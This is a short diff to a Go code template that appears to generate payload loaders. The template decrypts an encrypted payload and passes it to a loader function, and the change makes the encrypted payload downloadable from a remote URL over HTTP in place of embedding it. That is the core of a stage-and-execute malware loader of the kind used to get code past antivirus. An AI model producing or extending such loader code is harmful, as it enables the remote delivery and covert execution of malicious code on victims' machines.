@@ -37,10 +37,14 @@ func main() {
 	{{if .Compressor}}
     	    {{.CipherText}}, _ = {{.Compressor.Algorithm}}("{{.Payload}}", {{.Compressor.Ratio}})
     {{else}}
-            {{.CipherText}} := "{{.Payload}}"
+            {{.Remote.UrlName}} := "{{.Remote.Url}}"
+            {{.CipherText}}, _ := remote.HttpString({{.Remote.UrlName}})
     {{end}}
 
 	{{.PlainText}}, _ := crypto.{{.Decrypt}}({{.CipherText}}, {{.KeyName}}{{if .IvName}}, {{.IvName}}{{end}})
 
 	loader.{{.Loader}}({{.PlainText}})
 }
+
+
+
